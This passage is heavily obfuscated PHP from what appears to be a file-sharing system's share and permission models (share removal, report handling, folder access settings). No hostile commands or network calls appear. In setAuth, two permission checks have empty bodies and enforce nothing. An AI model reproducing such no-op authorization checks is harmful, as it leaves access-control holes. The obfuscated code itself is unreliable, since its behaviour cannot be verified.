$ëÚ¼ùÀÂ = Model($ş•¿ÊÆİ[832])->where($òÑ„”Üé)->field($ş•¿ÊÆİ[32])->select(); $±ïó±Ï¯ = array_to_keyvalue($ëÚ¼ùÀÂ, $ş•¿ÊÆİ[12], $ş•¿ÊÆİ[32]); $±ïó±Ï¯[] = $çÂ†¨Û©[$ş•¿ÊÆİ[32]]; return implode($ş•¿ÊÆİ[8], $±ïó±Ï¯); } protected function remove($òÍùæÚ) { $ªî§² =& $_SERVER[ñˆ‹ß¿÷]; if (is_array($òÍùæÚ)) { $òÍùæÚ = array($ªî§²[7], $òÍùæÚ); } $Ä¸×ˆ­ä = array($ªî§²[489] => $òÍùæÚ); $½‘ëŠ©‹ = $this->where($Ä¸×ˆ­ä)->delete(); if ($½‘ëŠ©‹) { Model($ªî§²[602])->where(array($ªî§²[489] => $òÍùæÚ))->delete(); } $ó°‚à³¦ = is_array($òÍùæÚ) ? $òÍùæÚ[1] : array($òÍùæÚ); for ($é‚ÁÜï = 0; $é‚ÁÜï < count($ó°‚à³¦); $é‚ÁÜï++) { $†“ÌÊ = $this->getInfo($ó°‚à³¦[$é‚ÁÜï]); if ($†“ÌÊ[$ªî§²[496]] == $ªî§²[88]) { Model($ªî§²[570])->eventShare($†“ÌÊ[$ªî§²[402]], $ªî§²[1991]); } if ($†“ÌÊ[$ªî§²[494]] == $ªî§²[88]) { Model($ªî§²[570])->eventShare($†“ÌÊ[$ªî§²[402]], $ªî§²[1990]); } } return $½‘ëŠ©‹; } protected function removeBySource($ÜÈ°¸Ÿ„) { $œœß®ï» =& $_SERVER[ñˆ‹ß¿÷]; $±Ãî”Éƒ = array($œœß®ï»[417] => array($œœß®ï»[418], $ÜÈ°¸Ÿ„)); $şŠÒ…ÛÈ = $this->field($œœß®ï»[489])->where($±Ãî”Éƒ)->select(); $şŠÒ…ÛÈ = array_to_keyvalue($şŠÒ…ÛÈ, $œœß®ï»[12], $œœß®ï»[489]); if (!$şŠÒ…ÛÈ) { return; } $±Ãî”Éƒ = array($œœß®ï»[488] => array($œœß®ï»[418], $şŠÒ…ÛÈ)); $this->where($±Ãî”Éƒ)->delete(); Model($œœß®ï»[602])->where($±Ãî”Éƒ)->delete(); } public function listAll($›¿›Şñú) { $‹áÚÄ€Ô =& $_SERVER[ñˆ‹ß¿÷]; $öæÚĞª‚ = array(); if ($›¿›Şñú[$‹áÚÄ€Ô[1664]]) { $öæÚĞª‚[$‹áÚÄ€Ô[1664]] = $›¿›Şñú[$‹áÚÄ€Ô[1664]]; } if ($›¿›Şñú[$‹áÚÄ€Ô[768]]) { $ó¡©÷Õ = $›¿›Şñú[$‹áÚÄ€Ô[497]] ? $›¿›Şñú[$‹áÚÄ€Ô[497]] : strtotime(date($‹áÚÄ€Ô[2003])); $öæÚĞª‚[$‹áÚÄ€Ô[200]] = array($‹áÚÄ€Ô[333], array($›¿›Şñú[$‹áÚÄ€Ô[768]], $ó¡©÷Õ)); } if ($›¿›Şñú[$‹áÚÄ€Ô[33]]) { $öæÚĞª‚[$›¿›Şñú[$‹áÚÄ€Ô[33]]] = 1; } else { $öæÚĞª‚[] = array($‹áÚÄ€Ô[494] => array($‹áÚÄ€Ô[1019], 0), $‹áÚÄ€Ô[496] => array($‹áÚÄ€Ô[1019], 0), $‹áÚÄ€Ô[1980] => $‹áÚÄ€Ô[1934]); } if ($›¿›Şñú[$‹áÚÄ€Ô[1930]]) { $öæÚĞª‚[] = array($‹áÚÄ€Ô[491] => $›¿›Şñú[$‹áÚÄ€Ô[1930]], $‹áÚÄ€Ô[1563] => array($‹áÚÄ€Ô[383], "\45{$›¿›Şñú[$‹áÚÄ€Ô[1930]]}\x25"), $‹áÚÄ€Ô[1980] => $‹áÚÄ€Ô[1934]); } $‹êĞû¯ì = $this->_makeOrder()->where($öæÚĞª‚)->selectPage(20); if (empty($‹êĞû¯ì[$‹áÚÄ€Ô[369]])) { return array(); } $this->_listDataApply($‹êĞû¯ì[$‹áÚÄ€Ô[369]]); return $‹êĞû¯ì; } public function listDataApply($ö‹ˆíİç) { $this->_listDataApply($ö‹ˆíİç); return $ö‹ˆíİç; } private function _listDataApply(&$³ä£—ıÍ) { $ûÒ±Ö‡¤ =& $_SERVER[ñˆ‹ß¿÷]; $ñ‰÷ƒ”Š = array_to_keyvalue($³ä£—ıÍ, $ûÒ±Ö‡¤[12], $ûÒ±Ö‡¤[1664]); $ñº¯•›„ = Model($ûÒ±Ö‡¤[535])->userListInfo(array_unique($ñ‰÷ƒ”Š)); $Í»ÂÀ°õ = array_to_keyvalue($³ä£—ıÍ, $ûÒ±Ö‡¤[12], $ûÒ±Ö‡¤[402]); $®©Ä€×÷ = Model($ûÒ±Ö‡¤[832])->sourceListInfo($Í»ÂÀ°õ, !0); foreach ($³ä£—ıÍ as $ø…·ÓâÑ => &$ÂÊí¦ÛÇ) { $´ÏÙ¬ = $ÂÊí¦ÛÇ[$ûÒ±Ö‡¤[1664]]; $ÂÊí¦ÛÇ[$ûÒ±Ö‡¤[2004]] = $ñº¯•›„[$´ÏÙ¬] ? $ñº¯•›„[$´ÏÙ¬] : !1; $ÍÈí™ö = $ÂÊí¦ÛÇ[$ûÒ±Ö‡¤[402]]; $ÂÊí¦ÛÇ[$ûÒ±Ö‡¤[86]] = $®©Ä€×÷[$ÍÈí™ö] ? $®©Ä€×÷[$ÍÈí™ö] : !1; if ($ÂÊí¦ÛÇ[$ûÒ±Ö‡¤[86]][$ûÒ±Ö‡¤[431]] == $ûÒ±Ö‡¤[88]) { unset($³ä£—ıÍ[$ø…·ÓâÑ]); } if ($ÂÊí¦ÛÇ[$ûÒ±Ö‡¤[86]] != $ûÒ±Ö‡¤[197] && !$ÂÊí¦ÛÇ[$ûÒ±Ö‡¤[86]]) { unset($³ä£—ıÍ[$ø…·ÓâÑ]); } } unset($ÂÊí¦ÛÇ); $³ä£—ıÍ = array_values($³ä£—ıÍ); } private function _makeOrder($¶†èÇú° = '') { $•‡îõØÖ =& $_SERVER[ñˆ‹ß¿÷]; $ğÅÁäÆ = array($•‡îõØÖ[200], $•‡îõØÖ[497], $•‡îõØÖ[1993], $•‡îõØÖ[1994]); $–µ”©‚Ô = array($•‡îõØÖ[450] => $•‡îõØÖ[451], $•‡îõØÖ[452] => $•‡îõØÖ[453]); $‡ô†÷­® = Input::get($•‡îõØÖ[457], $•‡îõØÖ[7], $•‡îõØÖ[423], $ğÅÁäÆ); $ÅÑï¬úÁ = Input::get($•‡îõØÖ[458], $•‡îõØÖ[7], $•‡îõØÖ[2005], array($•‡îõØÖ[1927], $•‡îõØÖ[452])); $ÅÑï¬úÁ = $–µ”©‚Ô[$ÅÑï¬úÁ]; $¶†èÇú° = $¶†èÇú° . "{$‡ô†÷­®}\x20{$ÅÑï¬úÁ}"; return $this->order($¶†èÇú°); } public function reportAdd($•ÁÛëş”) { $Ö¨şßÂ =& $_SERVER[ñˆ‹ß¿÷]; $¸¥åÚá« = array($Ö¨şßÂ[489] => $•ÁÛëş”[$Ö¨şßÂ[489]], $Ö¨şßÂ[1664] => USER_ID); if (Model($Ö¨şßÂ[2001])->where($¸¥åÚá«)->find()) { return !1; } $ÙïšïçÍ = array($Ö¨şßÂ[489] => $•ÁÛëş”[$Ö¨şßÂ[489]], $Ö¨şßÂ[1563] => $•ÁÛëş”[$Ö¨şßÂ[1563]], $Ö¨şßÂ[402] => $•ÁÛëş”[$Ö¨şßÂ[402]], $Ö¨şßÂ[468] => $•ÁÛëş”[$Ö¨şßÂ[468]], $Ö¨şßÂ[1664] => USER_ID, $Ö¨şßÂ[33] => $•ÁÛëş”[$Ö¨şßÂ[33]], $Ö¨şßÂ[453] => $•ÁÛëş”[$Ö¨şßÂ[453]]); return Model($Ö¨şßÂ[2001])->add($ÙïšïçÍ); } public function reportList($à‡¤†İ) { $âáˆ¢æô =& $_SERVER[ñˆ‹ß¿÷]; $éİœäÃ = array(); if ($à‡¤†İ[$âáˆ¢æô[768]]) { $«©û¼Â = $à‡¤†İ[$âáˆ¢æô[497]] ? $à‡¤†İ[$âáˆ¢æô[497]] : strtotime(date($âáˆ¢æô[2003])); $éİœäÃ[$âáˆ¢æô[200]] = array($âáˆ¢æô[333], array($à‡¤†İ[$âáˆ¢æô[768]], $«©û¼Â)); } if (isset($à‡¤†İ[$âáˆ¢æô[33]]) && in_array($à‡¤†İ[$âáˆ¢æô[33]], array($âáˆ¢æô[88], $âáˆ¢æô[437], $âáˆ¢æô[2006], $âáˆ¢æô[2007], $âáˆ¢æô[2008]))) { $éİœäÃ[$âáˆ¢æô[33]] = $à‡¤†İ[$âáˆ¢æô[33]]; } if (isset($à‡¤†İ[$âáˆ¢æô[757]]) && in_array($à‡¤†İ[$âáˆ¢æô[757]], array($âáˆ¢æô[197], $âáˆ¢æô[88], $âáˆ¢æô[437], $âáˆ¢æô[2006]))) { $éİœäÃ[$âáˆ¢æô[757]] = $à‡¤†İ[$âáˆ¢æô[757]]; } $–¶Ê£œÁ = Input::get($âáˆ¢æô[458], $âáˆ¢æô[7], $âáˆ¢æô[2005], array($âáˆ¢æô[1927], $âáˆ¢æô[452])); $Ú‡Œ¼ôÒ = array($âáˆ¢æô[450] => $âáˆ¢æô[451], $âáˆ¢æô[452] => $âáˆ¢æô[453]); $«¨¡÷—Œ = $âáˆ¢æô[2009] . $Ú‡Œ¼ôÒ[$–¶Ê£œÁ]; $Ó‡¥¤Ìæ = Model($âáˆ¢æô[2001])->where($éİœäÃ)->order($«¨¡÷—Œ)->selectPage(20); if (empty($Ó‡¥¤Ìæ[$âáˆ¢æô[369]])) { return array(); } $«’˜š€ = array_to_keyvalue_group($Ó‡¥¤Ìæ[$âáˆ¢æô[369]], $âáˆ¢æô[757], $âáˆ¢æô[489]); if (!empty($«’˜š€[0])) { $à‡¤†İ = $«’˜š€[0]; $éİœäÃ = array($âáˆ¢æô[489] => array($âáˆ¢æô[7], $à‡¤†İ)); $…éèÙ„æ = $this->where($éİœäÃ)->field($âáˆ¢æô[489])->select(); $…éèÙ„æ = array_to_keyvalue($…éèÙ„æ, $âáˆ¢æô[12], $âáˆ¢æô[489]); $Âõˆâêá = array_diff($à‡¤†İ, $…éèÙ„æ); if (!empty($Âõˆâêá)) { foreach ($Ó‡¥¤Ìæ[$âáˆ¢æô[369]] as $ÁÀõ¿İ¶ => $èä³÷İß) { if (in_array($èä³÷İß[$âáˆ¢æô[489]], $Âõˆâêá)) { unset($Ó‡¥¤Ìæ[$âáˆ¢æô[369]][$ÁÀõ¿İ¶]); } } } } $this->_listDataApply($Ó‡¥¤Ìæ[$âáˆ¢æô[369]]); return $Ó‡¥¤Ìæ; } public function reportStatus($ÜŸü›ò) { $¼ù£¨Ã— =& $_SERVER[ñˆ‹ß¿÷]; $Æò°ŠÓè = array($¼ù£¨Ã—[399] => $ÜŸü›ò[$¼ù£¨Ã—[399]]); $€¥«¾¼Û = Model($¼ù£¨Ã—[2001])->where($Æò°ŠÓè)->field($¼ù£¨Ã—[2010])->find(); if (!$€¥«¾¼Û) { return !1; } $Ï´âË = array($¼ù£¨Ã—[757] => $ÜŸü›ò[$¼ù£¨Ã—[757]]); if ($ÜŸü›ò[$¼ù£¨Ã—[757]] == $¼ù£¨Ã—[2006] && $€¥«¾¼Û[$¼ù£¨Ã—[757]] == $¼ù£¨Ã—[2006]) { $Ï´âË[$¼ù£¨Ã—[757]] = 0; } $éïãûÍÑ = Model($¼ù£¨Ã—[2001])->where($Æò°ŠÓè)->save($Ï´âË); if ($ÜŸü›ò[$¼ù£¨Ã—[757]] == $¼ù£¨Ã—[437]) { if ($€¥«¾¼Û[$¼ù£¨Ã—[468]] != $¼ù£¨Ã—[197] && $this->shareFileMeta($€¥«¾¼Û[$¼ù£¨Ã—[468]])) { $this->shareFileMeta($€¥«¾¼Û[$¼ù£¨Ã—[468]], 0); } $this->remove($€¥«¾¼Û[$¼ù£¨Ã—[489]]); return !0; } if ($éïãûÍÑ && $ÜŸü›ò[$¼ù£¨Ã—[757]] == $¼ù£¨Ã—[2006]) { $Ô æÈ°ƒ = $Ï´âË[$¼ù£¨Ã—[757]] == $¼ù£¨Ã—[2006] ? 1 : 0; $this->shareFileMeta($€¥«¾¼Û[$¼ù£¨Ã—[468]], $Ô æÈ°ƒ); $this->removeByFile($€¥«¾¼Û[$¼ù£¨Ã—[468]]); } return $éïãûÍÑ; } private function removeByFile($‹Ëœß†) { $´§†ãÙ˜ =& $_SERVER[ñˆ‹ß¿÷]; $êÈĞ“ã… = Model($´§†ãÙ˜[832])->where(array($´§†ãÙ˜[468] => $‹Ëœß†))->field($´§†ãÙ˜[402])->select(); $Ìå¹â™ß = array_to_keyvalue($êÈĞ“ã…, $´§†ãÙ˜[12], $´§†ãÙ˜[402]); $†£ÄÀŠ‡ = array($´§†ãÙ˜[402] => array($´§†ãÙ˜[7], $Ìå¹â™ß), $´§†ãÙ˜[494] => 1); $êÈĞ“ã… = $this->where($†£ÄÀŠ‡)->field($´§†ãÙ˜[489])->select(); if (empty($êÈĞ“ã…)) { return; } $ÍíÔÌú¼ = array_to_keyvalue($êÈĞ“ã…, $´§†ãÙ˜[12], $´§†ãÙ˜[489]); $this->remove($ÍíÔÌú¼); } private function shareFileMeta($Š¢¢Ò“ã, $ì¸ú‚í« = null) { $Óà˜¨Æ½ =& $_SERVER[ñˆ‹ß¿÷]; $š’°Ëã = array($Óà˜¨Æ½[468] => $Š¢¢Ò“ã, $Óà˜¨Æ½[94] => $Óà˜¨Æ½[2011]); if (is_null($ì¸ú‚í«)) { return Model($Óà˜¨Æ½[2012])->where($š’°Ëã)->find(); } $š’°Ëã[$Óà˜¨Æ½[374]] = $ì¸ú‚í«; Model($Óà˜¨Æ½[2012])->add($š’°Ëã, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\143\145\137\x61\x75\164\150"; public function getAuth($¶ÌäğË³) { $úŸåû¤ =& $_SERVER[ñˆ‹ß¿÷]; $Ş¿û¿© = $this->sourceAuthSelect($¶ÌäğË³); $ß¤”—™¾ = array(); $ÈõÉâöé = array(); $ˆÛ¾½Ø÷ = 2 << 25; foreach ($Ş¿û¿© as $¥ªšÕ…) { $àßÏ¯ÒÜ = Model($úŸåû¤[507])->listData($¥ªšÕ…[$úŸåû¤[1940]]); if (!$àßÏ¯ÒÜ) { continue; } $ß¤”—™¾[] = $¥ªšÕ…; $ÎÍÁ£ó = 0; if ($¥ªšÕ…[$úŸåû¤[411]] == SourceModel::TYPE_GROUP) { $ÎÍÁ£ó = $ˆÛ¾½Ø÷ * 2; } if ($¥ªšÕ…[$úŸåû¤[411]] == SourceModel::TYPE_USER) { $ÎÍÁ£ó = $ˆÛ¾½Ø÷; } if ($¥ªšÕ…[$úŸåû¤[411]] == SourceModel::TYPE_USER && $¥ªšÕ…[$úŸåû¤[505]] == $úŸåû¤[197]) { $ÎÍÁ£ó = 0; } $ÈõÉâöé[] = $àßÏ¯ÒÜ[$úŸåû¤[413]] + $ÎÍÁ£ó; } array_multisort($ÈõÉâöé, SORT_DESC, $ß¤”—™¾); return $ß¤”—™¾; } public function sourceAuthSelect($€­¼Öõ’) { $ÓÁÌÅ’¼ =& $_SERVER[ñˆ‹ß¿÷]; static $…îü”¾å = array(); $Î£ï“ì÷ = is_array($€­¼Öõ’) ? !1 : !0; if ($Î£ï“ì÷) { $€­¼Öõ’ = array($€­¼Öõ’); } $ıÑ›˜ºô = array(); foreach ($€­¼Öõ’ as $”íôƒµ) { if (isset($…îü”¾å[$”íôƒµ])) { $ıÑ›˜ºô[$”íôƒµ] = $…îü”¾å[$”íôƒµ]; } } if (count($ıÑ›˜ºô) == count($€­¼Öõ’)) { return $Î£ï“ì÷ ? $ıÑ›˜ºô[$€­¼Öõ’[0]] : $ıÑ›˜ºô; } $ÊÃ¸œœ = $ÓÁÌÅ’¼[2013]; $€ÌË­»‘ = array($ÓÁÌÅ’¼[402] => array($ÓÁÌÅ’¼[7], $€­¼Öõ’)); $ÌİœªÆÔ = $this->field($ÊÃ¸œœ)->order($ÓÁÌÅ’¼[399])->where($€ÌË­»‘)->select(); $¶ä£÷¯¯ = array_to_keyvalue_group($ÌİœªÆÔ, $ÓÁÌÅ’¼[402]); foreach ($€­¼Öõ’ as $”íôƒµ) { $…îü”¾å[$”íôƒµ] = $¶ä£÷¯¯[$”íôƒµ] ? $¶ä£÷¯¯[$”íôƒµ] : array(); } if ($Î£ï“ì÷) { return $ÌİœªÆÔ; } return $¶ä£÷¯¯; } public function setAuth($ŸÉøÅ‡‘, $·¯â³ï”) { $Š’öğè =& $_SERVER[ñˆ‹ß¿÷]; $Óâü—‚÷ = Model($Š’öğè[1334])->sourceInfo($ŸÉøÅ‡‘); if (!$Óâü—‚÷) { return !1; } if ($Óâü—‚÷[$Š’öğè[411]] != SourceModel::TYPE_GROUP) { return !1; } $±úÛâÄ¬ = 1; $èêĞ ±Š = $Óâü—‚÷[$Š’öğè[505]]; if ($èêĞ ±Š != $±úÛâÄ¬) { $ æ†Óº = array($Š’öğè[1836] => $èêĞ ±Š); $Ì ˆÛù… = Model($Š’öğè[1926])->field($Š’öğè[1664])->where($ æ†Óº)->select(); $Ì ˆÛù… = array_to_keyvalue($Ì ˆÛù…, $Š’öğè[12], $Š’öğè[1664]); } $Ì¸Ò¯ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $åî’¢Æ = array(); foreach ($·¯â³ï” as $Ÿ“—åòƒ) { if (!in_array($Ÿ“—åòƒ[$Š’öğè[411]], $Ì¸Ò¯)) { show_json(LNG($Š’öğè[2014]), !1); } if ($èêĞ ±Š != $±úÛâÄ¬) { if ($Ÿ“—åòƒ[$Š’öğè[411]] == SourceModel::TYPE_GROUP) { } if ($Ÿ“—åòƒ[$Š’öğè[505]] != 0 && !in_array($Ÿ“—åòƒ[$Š’öğè[505]], $Ì ˆÛù…)) { } } if ($Ÿ“—åòƒ[$Š’öğè[505]] == 0) { $Ÿ“—åòƒ[$Š’öğè[411]] = SourceModel::TYPE_USER; } $åî’¢Æ[] = array($Š’öğè[402] => $ŸÉøÅ‡‘, $Š’öğè[411] => intval($Ÿ“—åòƒ[$Š’öğè[411]]), $Š’öğè[505] => intval($Ÿ“—åòƒ[$Š’öğè[505]]), $Š’öğè[1940] => intval($Ÿ“—åòƒ[$Š’öğè[1940]]) ? intval($Ÿ“—åòƒ[$Š’öğè[1940]]) : 0, $Š’öğè[1996] => intval($Ÿ“—åòƒ[$Š’öğè[1996]]) ? intval($Ÿ“—åòƒ[$Š’öğè[1996]]) : -1); } $this->where(array($Š’öğè[417] => $ŸÉøÅ‡‘))->delete(); $this->addAll($åî’¢Æ); return !0; } public function authClear($¡Ô›±™Î) { $‘£ñÃš =& $_SERVER[ñˆ‹ß¿÷]; $ˆ²ÇøÄø = Model($‘£ñÃš[1334])->sourceInfo($¡Ô›±™Î); $éôÇğù = array($¡Ô›±™Î); if ($ˆ²ÇøÄø[$‘£ñÃš[410]] == $‘£ñÃš[88]) { $óğ½›” = array($‘£ñÃš[590] => array($‘£ñÃš[550], $ˆ²ÇøÄø[$‘£ñÃš[521]] . $¡Ô›±™Î . $‘£ñÃš[551])); $éôÇğù = Model($‘£ñÃš[1334])->field($‘£ñÃš[417])->where($óğ½›”)->getField($‘£ñÃš[402], !0); $éôÇğù[] = $¡Ô›±™Î; } $this->where(array($‘£ñÃš[417] => array($‘£ñÃš[418], $éôÇğù)))->delete(); return !0; } public function getAllChildren($ıñ”àøı) { $ıêŒäÈÈ =& $_SERVER[ñˆ‹ß¿÷]; $×¾İËÕ† = Model($ıêŒäÈÈ[1334])->sourceInfo($ıñ”àøı); if ($×¾İËÕ†[$ıêŒäÈÈ[410]] != $ıêŒäÈÈ[88]) { return $this->sourceListAuth(array($ıñ”àøı)); } if ($×¾İËÕ†[$ıêŒäÈÈ[411]] != SourceModel::TYPE_GROUP) { return array(); } $ß’²…®œ = 1; $¬ß£¦¼ô = array($ıñ”àøı); if ($×¾İËÕ†[$ıêŒäÈÈ[432]] == $ıêŒäÈÈ[197] && $×¾İËÕ†[$ıêŒäÈÈ[505]] != $ß’²…®œ) { $¬ß£¦¼ô = $this->groupChidldAllRootSource($×¾İËÕ†[$ıêŒäÈÈ[505]]); } $´ãˆƒ©ã = $this->field($ıêŒäÈÈ[402])->group($ıêŒäÈÈ[402])->select(); $´ãˆƒ©ã = array_to_keyvalue($´ãˆƒ©ã, $ıêŒäÈÈ[12], $ıêŒäÈÈ[402]); if (!$´ãˆƒ©ã) { return array(); } $Šâç²ç£ = $ıêŒäÈÈ[2015]; $”Åğ·íû = array($ıêŒäÈÈ[402] => array($ıêŒäÈÈ[7], $´ãˆƒ©ã), $ıêŒäÈÈ[431] => $ıêŒäÈÈ[197]); $’Ü¹î¦ = Model($ıêŒäÈÈ[832])->field($Šâç²ç£)->where($”Åğ·íû)->select(); $Æ§¿øšÅ = array($ıñ”àøı); foreach ($’Ü¹î¦ as $Å×º´¥) { foreach ($¬ß£¦¼ô as $õ½ã»‘) { $Ûõòˆ³‹ = $ıêŒäÈÈ[50] . $õ½ã»‘ . $ıêŒäÈÈ[50]; $Üáß¶¹˜ = $Å×º´¥[$ıêŒäÈÈ[521]] . $Å×º´¥[$ıêŒäÈÈ[402]] . $ıêŒäÈÈ[50]; if (strstr($Üáß¶¹˜, $Ûõòˆ³‹)) { $Æ§¿øšÅ[] = $Å×º´¥[$ıêŒäÈÈ[402]]; break; } } } return $this->sourceListAuth($Æ§¿øšÅ); } private function sourceListAuth($åÂ­…ÓÈ) { $¼³ù±óŸ =& $_SERVER[ñˆ‹ß¿÷]; $ïŸĞª€ = Model($¼³ù±óŸ[1334])->sourceListInfo($åÂ­…ÓÈ, !0); $òÓ¨À¿ = $this->sourceAuthSelect($åÂ­…ÓÈ); $‚–¡ÏšÙ = array(); $İ·Ì•®ä = array(); foreach ($ïŸĞª€ as $ÊÒĞó¨£) { unset($ÊÒĞó¨£[$¼³ù±óŸ[456]]); unset($ÊÒĞó¨£[$¼³ù±óŸ[454]]); unset($ÊÒĞó¨£[$¼³ù±óŸ[413]]); unset($ÊÒĞó¨£[$¼³ù±óŸ[86]]); $Ñ™Ë¹ëó = $òÓ¨À¿[$ÊÒĞó¨£[$¼³ù±óŸ[402]]]; if (!$Ñ™Ë¹ëó) { continue; } $ÊÒĞó¨£[$¼³ù±óŸ[2016]] = $this->authTargetInfo($Ñ™Ë¹ëó); $ÊÒĞó¨£[$¼³ù±óŸ[519]] = rtrim($ÊÒĞó¨£[$¼³ù±óŸ[525]], $¼³ù±óŸ[8]) . $¼³ù±óŸ[8] . ltrim($ÊÒĞó¨£[$¼³ù±óŸ[519]], $¼³ù±óŸ[8]); $‚–¡ÏšÙ[] = $ÊÒĞó¨£; $±¹å—ãĞ = count(explode($¼³ù±óŸ[8], trim($ÊÒĞó¨£[$¼³ù±óŸ[519]], $¼³ù±óŸ[8]))); $İ·Ì•®ä[] = $±¹å—ãĞ + ($ÊÒĞó¨£[$¼³ù±óŸ[33]] == $¼³ù±óŸ[75] ? 0 : 1000); } array_multisort($İ·Ì•®ä, SORT_ASC, $‚–¡ÏšÙ); return $‚–¡ÏšÙ; } private function groupChidldAllRootSource($ôíÄÈÂ¨) { $¡­­Á‘¢ =& $_SERVER[ñˆ‹ß¿÷]; $›ı•‡ö = Model($¡­­Á‘¢[2017])->groupChildrenAll($ôíÄÈÂ¨); $¼“¤Ê°© = array($¡­­Á‘¢[432] => 0, $¡­­Á‘¢[505] => array($¡­­Á‘¢[7], $›ı•‡ö), $¡­­Á‘¢[411] => SourceModel::TYPE_GROUP); $ûµ½ô›‚ = Model($¡­­Á‘¢[832])->field($¡­­Á‘¢[402])->where($¼“¤Ê°©)->select(); $ûµ½ô›‚ = array_to_keyvalue($ûµ½ô›‚, $¡­­Á‘¢[12], $¡­­Á‘¢[402]); return $ûµ½ô›‚; } private function authTargetInfo($®şúƒ­‘) { $›±ğ÷‰× =& $_SERVER[ñˆ‹ß¿÷]; $¢à‡£œ = array(); $±‡ÏÙø— = array(); $ßïºò´Ì = 2 << 25; foreach ($®şúƒ­‘ as $ÀğÅ¶Œó) { $÷–Â¢Ş· = Model($›±ğ÷‰×[507])->listData($ÀğÅ¶Œó[$›±ğ÷‰×[1940]]); if (!$÷–Â¢Ş·) { continue; } if ($ÀğÅ¶Œó[$›±ğ÷‰×[411]] == SourceModel::TYPE_USER) { $€ùİâòì = Model($›±ğ÷‰×[513])->getInfoSimpleOuter($ÀğÅ¶Œó[$›±ğ÷‰×[505]]); if ($€ùİâòì[$›±ğ÷‰×[1664]] == $›±ğ÷‰×[1197]) { continue; } if ($€ùİâòì[$›±ğ÷‰×[1664]] == $›±ğ÷‰×[197]) { $€ùİâòì[$›±ğ÷‰×[32]] = LNG($›±ğ÷‰×[2018]); } } else { $€ùİâòì = Model($›±ğ÷‰×[522])->getInfoSimple($ÀğÅ¶Œó[$›±ğ÷‰×[505]]); } if (!$€ùİâòì) { continue; } $€ùİâòì[$›±ğ÷‰×[467]] = $÷–Â¢Ş·; $¢à‡£œ[] = $€ùİâòì; $—ïƒœ„– = 0; if ($ÀğÅ¶Œó[$›±ğ÷‰×[411]] == SourceModel::TYPE_GROUP) { $—ïƒœ„– = $ßïºò´Ì * 2; } if ($ÀğÅ¶Œó[$›±ğ÷‰×[411]] == SourceModel::TYPE_USER) { $—ïƒœ„– = $ßïºò´Ì; } if ($ÀğÅ¶Œó[$›±ğ÷‰×[411]] == SourceModel::TYPE_USER && $ÀğÅ¶Œó[$›±ğ÷‰×[505]] == $›±ğ÷‰×[197]) { $—ïƒœ„– = 0; } $±‡ÏÙø—[] = $÷–Â¢Ş·[$›±ğ÷‰×[413]] + $—ïƒœ„–; } array_multisort($±‡ÏÙø—, SORT_DESC, $¢à‡£œ); return $¢à‡£œ; } public function getAllChildrenByUser($÷±¤ƒ“, $ëè™‚‘±) { $²¿ÊÑã =& $_SERVER[ñˆ‹ß¿÷]; $Ãàëßİ† = Model($²¿ÊÑã[535])->getInfo($ëè™‚‘±); if (!$ëè™‚‘± || !$÷±¤ƒ“ || !$Ãàëßİ†) { return array(); } $ÖÊàËÊÚ = Model($²¿ÊÑã[1334])->sourceInfo($÷±¤ƒ“); $®‡–Ö²ú = array(); $ºÜ“˜Æ = 1; if ($ÖÊàËÊÚ[$²¿ÊÑã[432]] == $²¿ÊÑã[197] && $ÖÊàËÊÚ[$²¿ÊÑã[505]] != $ºÜ“˜Æ && $this->groupContainUser($ÖÊàËÊÚ[$²¿ÊÑã[505]], $ëè™‚‘±)) { foreach ($Ãàëßİ†[$²¿ÊÑã[2019]] as $°‡°ˆÇ) { $ÚáÆ½Ó• = Model($²¿ÊÑã[522])->getInfo($°‡°ˆÇ[$²¿ÊÑã[1836]]); $çåáŸ§Ø = Model($²¿ÊÑã[535])->getInfoSimpleOuter($ëè™‚‘±); $çåáŸ§Ø[$²¿ÊÑã[467]] = $°‡°ˆÇ[$²¿ÊÑã[413]]; if (Model($²¿ÊÑã[507])->authCheckAction($°‡°ˆÇ[$²¿ÊÑã[413]][$²¿ÊÑã[413]], $²¿ÊÑã[1857])) { continue; } $×«È³ = array($²¿ÊÑã[32] => $²¿ÊÑã[1612] . $ÚáÆ½Ó•[$²¿ÊÑã[32]], $²¿ÊÑã[402] => $ÚáÆ½Ó•[$²¿ÊÑã[86]][$²¿ÊÑã[402]], $²¿ÊÑã[84] => KodIO::make($ÚáÆ½Ó•[$²¿ÊÑã[86]][$²¿ÊÑã[402]]), $²¿ÊÑã[432] => $²¿ÊÑã[197], $²¿ÊÑã[411] => $²¿ÊÑã[515], $²¿ÊÑã[33] => $²¿ÊÑã[554], $²¿ÊÑã[519] => $ÚáÆ½Ó•[$²¿ÊÑã[526]], $²¿ÊÑã[1836] => $ÚáÆ½Ó•[$²¿ÊÑã[1836]], $²¿ÊÑã[523] => $ÚáÆ½Ó•[$²¿ÊÑã[432]], $²¿ÊÑã[2016] => array($çåáŸ§Ø)); $®‡–Ö²ú[$×«È³[$²¿ÊÑã[402]]] = $×«È³; } } $Î±¼ßøğ = array(); $Á´Ø÷’¦ = $this->getAllChildren($÷±¤ƒ“); foreach ($Á´Ø÷’¦ as $î…Êí­ã) { $×¾¼È = !1; foreach ($î…Êí­ã[$²¿ÊÑã[2016]] as $ÃÓµ¶Ÿ) { if ($ÃÓµ¶Ÿ[$²¿ÊÑã[1664]]) { if ($ÃÓµ¶Ÿ[$²¿ÊÑã[1664]] == $ëè™‚‘±) { $×¾¼È = !0; break; } } if ($ÃÓµ¶Ÿ[$²¿ÊÑã[1836]]) { if ($this->groupContainUser($ÃÓµ¶Ÿ[$²¿ÊÑã[1836]], $ëè™‚‘±)) { $×¾¼È = !0; break; } } } if ($×¾¼È) { $Î±¼ßøğ[] = $î…Êí­ã; } $Ë®×üıá = $î…Êí­ã[$²¿ÊÑã[402]]; if (isset($®‡–Ö²ú[$Ë®×üıá])) { $î…Êí­ã[$²¿ÊÑã[2016]][] = $®‡–Ö²ú[$Ë®×üıá][0]; $®‡–Ö²ú[$Ë®×üıá] = !1; } } $®‡–Ö²ú = array_filter(array_values($®‡–Ö²ú)); $Î±¼ßøğ = array_merge($®‡–Ö²ú, $Î±¼ßøğ); return $Î±¼ßøğ; } public function setAllChildrenByUser($å¨Şı¯£, $İš©õÄë, $¾ïÀˆŠ´) { $¼¶Òû‡ò =& $_SERVER[ñˆ‹ß¿÷]; $¶ßõÈş = $this->getAllChildrenByUser($å¨Şı¯£, $İš©õÄë); if (!$¾ïÀˆŠ´ || !$¶ßõÈş) { return !1; } foreach ($¶ßõÈş as $¡ª¬êÛÏ) { $×ŞşË = array(); foreach 